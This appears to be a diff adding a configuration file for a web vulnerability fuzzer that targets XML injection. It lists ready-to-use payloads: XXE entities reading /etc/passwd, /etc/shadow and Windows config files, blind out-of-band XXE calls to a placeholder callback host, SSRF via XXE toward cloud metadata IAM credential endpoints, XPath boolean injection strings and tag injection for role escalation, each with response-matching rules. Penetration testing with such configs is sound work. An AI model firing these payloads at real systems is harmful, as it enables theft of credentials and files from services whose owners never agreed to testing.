@@ -1,0 +1,124 @@
+# XML Injection Testing Config
+# Rules 1-4 target XML/SOAP body parameters specifically since XXE payloads
+# require a full XML document structure to be meaningful.
+# Rules 5-6 (XPath, tag injection) are applied broadly with no target/filter.
+
+rules:
+  # Rule 1: XXE - Basic file read (Linux/Windows)
+  # Replace the body target value with whatever the root XML element is
+  # for your target endpoint. Looks for file content in the response.
+  - filter:
+      url_path_contains: /xml
+    target:
+      type: body
+      name: xml
+    payloads:
+      type: list
+      source:
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/inetpub/wwwroot/web.config\">]><foo>&xxe;</foo>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "root:x:0:0|daemon:|\\[fonts\\]|\\[extensions\\]|for 16-bit app support"
+      status_code: 500
+
+  # Rule 2: XXE - Blind OOB via HTTP callback
+  # Replace YOUR.COLLABORATOR.URL with your Burp Collaborator or interactsh host.
+  # No response indicators here - check your OOB receiver for DNS/HTTP callbacks.
+  # Use --diff-analysis to catch timing anomalies.
+  - filter:
+      url_path_contains: /xml
+    target:
+      type: body
+      name: xml
+    payloads:
+      type: list
+      source:
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://YOUR.COLLABORATOR.URL/xxe_basic\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://YOUR.COLLABORATOR.URL/xxe_param\"> %xxe;]>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://YOUR.COLLABORATOR.URL/xxe_ssrf\">]><foo>&xxe;</foo>"
+    conditions:
+      match_mode: "any"
+      response_time_gt: 4.5
+      status_code: 500
+
+  # Rule 3: XXE - SSRF via XXE probing internal hosts
+  # Cloud metadata endpoints and common internal hosts.
+  # Timing difference between reachable and unreachable hosts is the key signal.
+  - filter:
+      url_path_contains: /xml
+    target:
+      type: body
+      name: xml
+    payloads:
+      type: list
+      source:
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1/\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://10.0.0.1/\">]><foo>&xxe;</foo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost/admin\">]><foo>&xxe;</foo>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "ami-id|instance-id|security-credentials|AWSAccessKeyId|placement"
+      response_time_gt: 4.5
+
+  # Rule 4: XML syntax breaking - detect XML parsing errors
+  # Bare syntax-breaking characters injected into all parameters.
+  # Confirms whether user input is being embedded in XML server-side.
+  # No filter/target - applied broadly.
+  - payloads:
+      type: list
+      source:
+        - "<"
+        - ">"
+        - "]]>"
+        - "&"
+        - "\"/>"
+        - "'/>"
+        - "<!--"
+        - "</foo>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "xml parsing error|saxparseexception|xmlsyntaxerror|malformed xml|undefined entity|not properly terminated|com\\.sun\\.org\\.apache\\.xerces|org\\.xml\\.sax|System\\.Xml\\.XmlException|SimpleXMLElement|DOMDocument"
+      status_code: 500
+
+  # Rule 5: XPath injection
+  # Same differential approach as SQLi boolean testing.
+  # True condition (1=1 equivalent) vs false condition (1=2 equivalent)
+  # should produce different responses if XPath injection is present.
+  # Run with --diff-analysis to catch boolean response differences.
+  - payloads:
+      type: list
+      source:
+        - "' or '1'='1"
+        - "' or ''='"
+        - "') or ('1'='1"
+        - "x' or 1=1 or 'x'='y"
+        - "' or local-name()='foo"
+        - "' or '1'='2"
+        - "') or ('1'='2"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "XPathException|Invalid XPath|xpath error|javax\\.xml\\.xpath|XPath|XPATH"
+      status_code: 500
+
+  # Rule 6: XML tag injection
+  # For inputs that get embedded inside an XML document server-side.
+  # Injected tags appearing unescaped in the response, or behaviour
+  # changes (e.g. role escalation), are the key signals.
+  - payloads:
+      type: list
+      source:
+        - "<foo>test</foo>"
+        - "]]><foo>test</foo>"
+        - "</name><admin>true</admin><name>"
+        - "</user><role>admin</role><user>"
+        - "</value><inject>true</inject><value>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "<admin>|<role>admin|<inject>|<foo>test</foo>"
+      status_code: 500
